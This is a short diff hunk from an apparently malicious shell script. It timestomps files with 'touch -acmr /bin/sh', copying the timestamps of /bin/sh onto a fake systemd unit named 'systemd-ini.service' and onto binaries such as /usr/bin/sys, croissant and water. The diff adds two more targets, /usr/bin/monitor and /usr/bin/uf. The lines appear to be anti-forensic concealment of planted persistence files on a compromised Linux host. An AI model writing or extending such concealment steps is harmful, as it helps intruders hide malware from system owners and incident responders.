@@ -14,3 +14,5 @@ touch -acmr /bin/sh /etc/systemd/system/systemd-ini.service
 touch -acmr /bin/sh /usr/bin/sys
 touch -acmr /bin/sh /usr/bin/croissant
 touch -acmr /bin/sh /usr/bin/water
+touch -acmr /bin/sh /usr/bin/monitor
+touch -acmr /bin/sh /usr/bin/uf
